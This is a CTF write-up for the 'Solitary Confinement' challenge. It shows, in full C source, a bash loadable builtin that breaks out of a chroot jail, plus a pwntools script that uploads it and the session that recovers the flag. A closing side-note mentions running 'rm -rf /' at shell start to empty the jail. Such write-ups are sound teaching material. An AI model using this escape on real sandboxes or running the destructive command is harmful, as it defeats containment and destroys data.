# Writeup for `Solitary Confinement`

## CTFd Description

It's lonely in here...

## Walkthrough

Immediately upon connecting to the remote, we get a root bash shell!
```
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
--------------------------------------------------------------------------------
bash-5.2# 
```

Easy, right? Let's just get the flag!
```
bash-5.2# ls
ls
bash: ls: command not found
```
oh :(

```
bash-5.2# pwd 
pwd
/
bash-5.2# echo *      
echo *
*
```
There appear to be no files at all on the system. The flag must be somewhere else.

Maybe the environment variables?
<details>
<summary><code>bash-5.2# set</code> (click to expand)</summary>
<pre>
bash-5.2# set
set
BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:globskipdots:hostcomplete:interactive_comments:patsub_replacement:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="2" [2]="21" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.2.21(1)-release'
COLUMNS=80
DIRSTACK=()
EUID=0
GROUPS=()
HISTFILE=//.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOSTNAME=solitary
HOSTTYPE=x86_64
IFS=$' \t\n'
LINES=24
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
PIPESTATUS=([0]="127")
PPID=1
PS1='\s-\v\$ '
PS2='> '
PS4='+ '
PWD=/
SHELL=/bin/sh
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments
SHLVL=2
TERM=dumb
UID=0
_=printenv
</pre>
</details>
No luck.
<br><br>

Maybe it's in the command-line args?
```
bash-5.2# echo $#
echo $#
0
```
Also no.

This is pretty much everywhere we can look with plain bash, let's try to run something else. We'll need a way to execute arbitrary code, not just shell commands. There aren't any binaries currently, but maybe we can create one?
```
bash-5.2# echo 'hi' > test
echo 'hi' > test
bash-5.2# echo *
echo *
test
```
So we can create files, but we still have no way to make them executable.

Let's run `enable` to look at all of Bash's builtins:
<details>
<summary><code>bash-5.2# enable -a</code> (click to expand)</summary>
<pre>
bash-5.2# enable -a
enable -a
enable .
enable :
enable [
enable alias
enable bg
enable bind
enable break
enable builtin
enable caller
enable cd
enable command
enable compgen
enable complete
enable compopt
enable continue
enable declare
enable dirs
enable disown
enable echo
enable enable
enable eval
enable exec
enable exit
enable export
enable false
enable fc
enable fg
enable getopts
enable hash
enable help
enable history
enable jobs
enable kill
enable let
enable local
enable logout
enable mapfile
enable popd
enable printf
enable pushd
enable pwd
enable read
enable readarray
enable readonly
enable return
enable set
enable shift
enable shopt
enable source
enable suspend
enable test
enable times
enable trap
enable true
enable type
enable typeset
enable ulimit
enable umask
enable unalias
enable unset
enable wait
</pre>
</details>
<br>

The only immediately interesting things in here are `eval` and `exec`:

- `eval` executes a string of bash commands, so it isn't helpful to us.

- `exec` replaces the current shell with a specified program (a la `execve`). This would be great, but it requires the program to be executable.

However, the `enable` builtin itself doesn't just enable and disable builtins! Here's its documentation:

<blockquote>
<h3>enable</h3>

`enable [-a] [-dnps] [-f filename] [name …]`

Enable and disable builtin shell commands. Disabling a builtin allows a disk command which has the same name as a shell builtin to be executed without specifying a full pathname, even though the shell normally searches for builtins before disk commands. If -n is used, the names become disabled. Otherwise names are enabled. For example, to use the test binary found via $PATH instead of the shell builtin version, type ‘enable -n test’.

If the -p option is supplied, or no name arguments appear, a list of shell builtins is printed. With no other arguments, the list consists of all enabled shell builtins. The -a option means to list each builtin with an indication of whether or not it is enabled.

**The -f option means to load the new builtin command name from shared object filename, on systems that support dynamic loading. Bash will use the value of the BASH_LOADABLES_PATH variable as a colon-separated list of directories in which to search for filename. The default is system-dependent. The -d option will delete a builtin loaded with -f.**

If there are no options, a list of the shell builtins is displayed. The -s option restricts enable to the POSIX special builtins. If -s is used with -f, the new builtin becomes a special builtin (see Special Builtins).

If no options are supplied and a name is not a shell builtin, enable will attempt to load name from a shared object named name, as if the command were ‘enable -f name name’.

The return status is zero unless a name is not a shell builtin or there is an error loading a new builtin from a shared object.
</blockquote>

We can load a builtin from a shared object! Since shared objects don't need to be executable, this should let us execute arbitrary code.

Given the name of the challenge, the fact that we're root, and the absence of anything in the current root directory, we're probably in a chroot jail. Let's try writing a bash loadable that performs a chroot jail escape.

_I wrote this by basically shoving http://www.unixwiz.net/techtips/mirror/chroot-break.html into one of the loadable builtin templates in the bash source tree._
```C
#include <config.h>
#include <stdio.h>

#include "builtins.h"
#include "shell.h"
#include "bashgetopt.h"
#include "common.h"

#include <stdio.h>  
#include <errno.h>  
#include <fcntl.h>  
#include <string.h>  
#include <unistd.h>  
#include <sys/stat.h>  
#include <sys/types.h>  

#define NEED_FCHDIR 1
   
#define TEMP_DIR "waterbuffalo"  

int
escape_builtin (list)
     WORD_LIST *list;
{
  int opt;

  reset_internal_getopt ();
  while ((opt = internal_getopt (list, "")) != -1)
    {
      switch (opt)
	{
	CASE_HELPOPT;
	default:
	  builtin_usage ();
	  return (EX_USAGE);
	}
    }
  list = loptend;
  if (list)
    {
      builtin_usage ();
      return (EX_USAGE);
    }

  /* Break out of a chroot() environment in C */
  int x;            /* Used to move up a directory tree */  
  int done=0;       /* Are we done yet ? */  
#ifdef NEED_FCHDIR  
  int dir_fd;       /* File descriptor to directory */  
#endif  
  struct stat sbuf; /* The stat() buffer */  
   
  /*  
  ** First we create the temporary directory if it doesn't exist  
  */  
  if (stat(TEMP_DIR,&sbuf)<0) {  
    if (errno==ENOENT) {  
      if (mkdir(TEMP_DIR,0755)<0) {  
        fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,  
                strerror(errno));  
        exit(1);  
      }  
    } else {  
      fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,  
              strerror(errno));  
      exit(1);  
    }  
  } else if (!S_ISDIR(sbuf.st_mode)) {  
    fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);  
    exit(1);  
  }  
   
#ifdef NEED_FCHDIR  
  /*  
  ** Now we open the current working directory  
  **  
  ** Note: Only required if chroot() changes the calling program's  
  **       working directory to the directory given to chroot().  
  **  
  */  
  if ((dir_fd=open(".",O_RDONLY))<0) {  
    fprintf(stderr,"Failed to open \".\" for reading - %s\n",  
            strerror(errno));  
    exit(1);  
  }  
#endif  
   
  /*  
  ** Next we chroot() to the temporary directory  
  */  
  if (chroot(TEMP_DIR)<0) {  
    fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,  
            strerror(errno));  
    exit(1);  
  }  
   
#ifdef NEED_FCHDIR  
  /*  
  ** Partially break out of the chroot by doing an fchdir()  
  **  
  ** This only partially breaks out of the chroot() since whilst  
  ** our current working directory is outside of the chroot() jail,  
  ** our root directory is still within it. Thus anything which refers  
  ** to "/" will refer to files under the chroot() point.  
  **  
  ** Note: Only required if chroot() changes the calling program's  
  **       working directory to the directory given to chroot().  
  **  
  */  
  if (fchdir(dir_fd)<0) {  
    fprintf(stderr,"Failed to fchdir - %s\n",  
            strerror(errno));  
    exit(1);  
  }  
  close(dir_fd);  
#endif  
   
  /*  
  ** Completely break out of the chroot by recursing up the directory  
  ** tree and doing a chroot to the current working directory (which will  
  ** be the real "/" at that point). We just do a chdir("..") lots of  
  ** times (1024 times for luck :). If we hit the real root directory before  
  ** we have finished the loop below it doesn't matter as .. in the root  
  ** directory is the same as . in the root.  
  **  
  ** We do the final break out by doing a chroot(".") which sets the root  
  ** directory to the current working directory - at this point the real  
  ** root directory.  
  */  
  for(x=0;x<1024;x++) {  
    chdir("..");  
  }  
  chroot(".");  
  return (EXECUTION_SUCCESS);
}

char *escape_doc[] = {
	"Escape (:",
	"",
	"",
	(char *)NULL
};

struct builtin escape_struct = {
	"escape",
	escape_builtin,
	BUILTIN_ENABLED,
	escape_doc,
	"escape",
	0
};
```

After compiling this to a shared object called `escape`, we can use a simple pwntools script to copy it to the remote:

```py
from pwn import *

conn = remote('solitary.ctf.secso.cc', 31337)

with open('./escape', 'rb') as f:
    so = f.read()
    so_str = "".join(["\\" + hex(byte)[1:] for byte in so])

    conn.send(b"echo -e -n '" + so_str.encode() + b"' > ./escape\n")

conn.interactive()
```

Now we can load and run the builtin to escape the jail!

```
[+] Opening connection to solitary.ctf.secso.cc on port 31337: Done
[*] Switching to interactive mode
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
--------------------------------------------------------------------------------
<\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0' > ./escape
bash-5.2# $ enable -f ./escape escape
enable -f ./escape escape
bash-5.2# $ escape
escape
bash-5.2# $ ls
ls
bin
etc
flag
home
jail
lib
lib64
opt
root
sbin
solitary
usr
var
bash-5.2# $ cat flag
cat flag
SCONES{s0rry_about_th3_war_cr1mes}
```

Yay! We've escaped.

## A fun side-note
You might be wondering how I made the jail entirely empty.

If the jail was initially empty then I wouldn't have been able to run Bash, since it runs after chrooting. I _could_ have done some trickery with `execveat`, but I chose a much simpler method: just run `rm --rf /`! (don't try this at home)

By setting the `--init-file` option to a script that deletes everything, the jail is immediately emptied when Bash starts.
